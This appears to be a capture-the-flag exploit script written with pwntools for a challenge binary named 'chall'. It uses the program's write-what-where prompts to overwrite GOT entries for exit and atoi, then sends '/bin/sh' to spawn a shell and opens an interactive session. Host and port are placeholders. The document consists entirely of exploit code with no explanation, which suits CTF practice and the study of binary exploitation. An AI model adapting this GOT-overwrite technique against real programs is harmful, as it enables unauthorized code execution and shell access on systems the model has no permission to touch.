# -- coding: utf-8 --
from pwn import *

# ENV
PORT = 0000
HOST = "host"
e = context.binary = ELF('./chall')
# lib = ELF('')
lib = e.libc
if len(sys.argv) > 1 and sys.argv[1] == 'r':
    r = remote(HOST, PORT)
else:
    r = e.process()
# pause()
# VARIABLE


# PAYLOAD
r.sendafter('what?', p32(0x4011a9)) 
r.sendlineafter('where?', str(e.got.exit))

r.sendafter('what?', p32(0xfa600000))
r.sendlineafter('where?', str(e.got.atoi - 2))
r.sendafter('what?', 'AAAA')
r.sendlineafter('where?', "/bin/sh\x00")


r.interactive()
